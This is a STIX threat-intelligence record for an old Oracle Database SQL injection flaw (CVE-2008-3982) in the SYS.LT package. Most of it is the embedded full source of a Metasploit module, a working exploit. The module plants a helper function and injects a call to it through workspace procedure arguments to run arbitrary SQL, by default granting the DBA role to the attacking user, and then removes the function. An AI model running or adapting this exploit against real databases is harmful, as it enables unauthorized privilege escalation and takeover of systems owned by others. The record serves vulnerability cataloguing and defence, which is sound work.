{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d33f88df-cd05-4c75-949f-61dfe1ac0dca",
    "created": "2024-08-14T16:22:13.075194Z",
    "modified": "2024-08-14T16:22:13.075198Z",
    "name": "Oracle DB SQL Injection via SYS.LT.COMPRESSWORKSPACE",
    "description": " This module exploits an sql injection flaw in the COMPRESSWORKSPACE procedure of the PL/SQL package SYS.LT. Any user with execute privilege on the vulnerable package can exploit this vulnerability. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/sqli/oracle/lt_compressworkspace.rb",
            "external_id": "lt_compressworkspace.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-3982"
        },
        {
            "source_name": "reference",
            "url": "http://www.oracle.com/technology/deploy/security/critical-patch-updates/cpuoct2008.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::ORACLE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Oracle DB SQL Injection via SYS.LT.COMPRESSWORKSPACE',\n      'Description'    => %q{\n        This module exploits an sql injection flaw in the COMPRESSWORKSPACE\n        procedure of the PL/SQL package SYS.LT. Any user with execute\n        privilege on the vulnerable package can exploit this vulnerability.\n      },\n      'Author'         => [ 'CG' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2008-3982'],\n          [ 'OSVDB', '49324'],\n          [ 'URL', 'http://www.oracle.com/technology/deploy/security/critical-patch-updates/cpuoct2008.html' ]\n        ],\n      'DisclosureDate' => '2008-10-13'))\n\n      register_options(\n        [\n          OptString.new('SQL', [ false, 'SQL to execte.',  \"GRANT DBA to #{datastore['DBUSER']}\"]),\n        ])\n  end\n\n  def run\n    return if not check_dependencies\n\n    name  = Rex::Text.rand_text_alpha_upper(rand(10) + 1)\n    cruft = Rex::Text.rand_text_alpha_upper(1)\n\n    function = \"\n      CREATE OR REPLACE FUNCTION #{cruft}\n      RETURN VARCHAR2 AUTHID CURRENT_USER\n      AS\n      PRAGMA AUTONOMOUS_TRANSACTION;\n      BEGIN\n      EXECUTE IMMEDIATE '#{datastore['SQL']}';\n      COMMIT;\n      RETURN '#{cruft}';\n      END;\"\n\n    package1 = \"BEGIN SYS.LT.CREATEWORKSPACE('#{name}'' and #{datastore['DBUSER']}.#{cruft}()=''#{cruft}'); END;\"\n\n    package2 = \"BEGIN SYS.LT.COMPRESSWORKSPACETREE('#{name}'' and #{datastore['DBUSER']}.#{cruft}()=''#{cruft}'); END;\"\n\n    clean = \"DROP FUNCTION #{cruft}\"\n\n    print_status(\"Attempting sql injection on SYS.LT.COMPRESSWORKSPACE...\")\n\n    print_status(\"Sending function...\")\n    prepare_exec(function)\n\n    begin\n      prepare_exec(package1)\n      prepare_exec(package2)\n    rescue  => e\n      if ( e.to_s =~ /No Data/ )\n        print_status(\"Removing function '#{cruft}'...\")\n        prepare_exec(clean)\n      else\n        return\n      end\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-10-13"
}